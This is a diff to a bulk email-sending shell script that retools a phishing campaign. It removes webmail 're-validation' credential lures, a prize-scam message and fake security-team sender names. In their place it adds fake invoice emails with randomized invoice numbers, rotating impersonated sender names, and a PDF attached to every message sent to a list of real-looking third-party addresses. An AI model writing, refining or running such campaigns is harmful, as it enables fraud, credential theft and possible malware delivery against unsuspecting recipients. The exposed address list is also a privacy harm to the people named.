@@ -88,10 +88,24 @@ sudo chown $USER:$USER *
 # Create a sample HTML email content (email.html)
 echo "Creating email.html with email content..."
 cat > email.html <<EOL
+<!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>Invoice</title>
+</head>
 <body>
-  <h1>PrimeRewardSpot iPhone 16 Pro</h1>
-  <p>Congratulations! You are eligible to win an iPhone 16 Pro.</p>
+    <p>Hello {recipient-user},</p>
+    
+    <p>As per our agreement, please find attached the invoice for your review. Below are the key details for your reference:</p>
+    
+    <p>Date Issued: {date}<br>
+    Invoice No.: #{random-number}</p>
+    
+    <p>If you have any questions or need any adjustments, don't hesitate to let me know.</p>
+    
+    <p>Best regards,<br>
+    L.K.C groups</p>
 </body>
 </html>
 EOL
@@ -99,44 +113,92 @@ EOL
 # Create a sample txt subject content (subject.txt)
 echo "Creating subject.txt with subject content..."
 cat > subject.txt <<EOL
-{recipient-user}, confirm your access
-Revalidate by {date}
-{time} security check required
-{recipient-domain} access expiring
-{recipient-user}, confirm access
-{time} security check
-{recipient-domain} access alert
-Last chance: {date}
-{recipient-user} validation
-Expire {date} - act
-Secure {recipient-domain}
-{recipient-user} must confirm
-{recipient-user} re-auth
-Before {date}
-{time} confirm now
-Protect {recipient-domain}
-{recipient-user} validate
+Invoice #{random-number} for your records
+INV#{random-number} {date}
+Re: INV#{random-number} {date}
+INV#{random-number} | {date}
+{date} | INV#{random-number}
+INV {random-number} {date}
+Document INV#{random-number} {date}
+{date} INV#{random-number}
+INV#{random-number} – {date}
+Invoice {random-number} {date}
+Re: {date} INV#{random-number}
+Your invoice #{random-number} is ready
+Invoice #{random-number} - Payment due {date}
+Payment confirmation #{random-number}
+Invoice #{random-number} from {date}
+Document #{random-number} for your review
+Invoice #{random-number} - Thank you
+Payment receipt #{random-number}
+Invoice #{random-number} details enclosed
+Regarding invoice #{random-number}
 EOL
 
 # Create a sample txt name content (name.txt)
 echo "Creating name.txt with name content..."
 cat > name.txt <<EOL
-IT Governance
-Mail Shield
-Domain Guardian
-Inbox Sentinel
-Cyber Patrol
-Firewall Watch
-Secure Gateway
-Data Bastion
-Threat Response
+James Carter
+Sophia Reynolds
+Michael Donovan
+Olivia Bennett
+Robert Kingsley
+David MacAllister
+Emma Sterling
+Daniel Wright
+Hannah Fletcher
+Liam O’Connor
+Sarah Jennings
+Ethan Blackwell
+Grace Holloway
+Nathan Briggs
+Zoe Harrington
+Accounting
+Benjamin Reeves
+Charlotte Whitmore
+Samuel Dawson
+Lily Caldwell
+Aaron Sinclair
+Ryan Callahan
+Ava Kensington
+Jordan Mercer
+Sophie Lancaster
+Tyler Winslow
+Human Resources
+Natalie Foster
+Christopher Vance
+Maya Ellington
+Patrick Rowe
+Isabel Thornton
+Alexander Hartman
+Chloe Davenport
+Caleb Montgomery
+Scarlett Whitaker
+Dylan Prescott
+Rachel Donovan
+Marcus Steele
+Evelyn Archer
+Dominic Shaw
+Harper Langley
+IT & Digital Solutions
+Adrian Cole
+Victoria Rhodes
+Sebastian Frost
+Penelope Grant
+Julian Pierce
+Logistics & Supply Chain
+Gabriel Stone
+Madeline Cross
+Owen Fletcher
+Audrey Manning
+Lucas Greyson
 EOL
 
 # Create a sample txt list content (list.txt)
 echo "Creating list.txt with list content..."
 cat > list.txt <<EOL
 boxxfc@gmail.com
-info@brickx.com
+info@brickx.us
 gwenna@gwennakadima.com
 mackenzie@walshequipment.ca
 podpora@vsezapivo.si
@@ -155,8 +217,8 @@ NAME_FILE="name.txt"
 LOG_FILE="send_log_\$(date +%Y%m%d).txt"
 
 # Optional settings
-ATTACH_FILE=""        # Set to path of file to attach, or leave empty
-SEND_AS_HTML=true     # Set to false to send only plain text version
+ATTACH_FILE="INV#2025-1093_L.K.C.pdf"        # Set to path of file to attach, or leave empty
+SEND_AS_HTML=false     # Set to false to send only plain text version
 
 # Initialize counters
 TOTAL=\$(wc -l < "\$EMAIL_LIST")
@@ -216,19 +278,18 @@ while IFS= read -r email; do
     # Create text version
     TEMP_TEXT=\$(mktemp)
     cat <<EOF > "\$TEMP_TEXT"
-Webmail - Mail. Host. Online
+Hello \$EMAIL_USER,
 
-Email Account Status Changed
+As per our agreement, please find attached the invoice for your review. Below are the key details for your reference:
 
-Hi \$EMAIL_USER,
+Date Issued: \$CURRENT_DATE
+Invoice No.: #\$RANDOM_NUMBER
 
-We are reaching out to inform you that your webmail account requires re-validation before June 10, 2025 to ensure continued access.
+If you have any questions or need any adjustments, don’t hesitate to let me know.
 
-Reactivate now by visiting your webmail portal.
 
-You received this email because you are registered. This is to ensure compliance with our Terms of Service or other legitimate matters.
-
-Privacy Policy © 2004–2025 Webmail International Ltd.
+Best regards,
+L.K.C groups
 EOF
 
 # Send with options
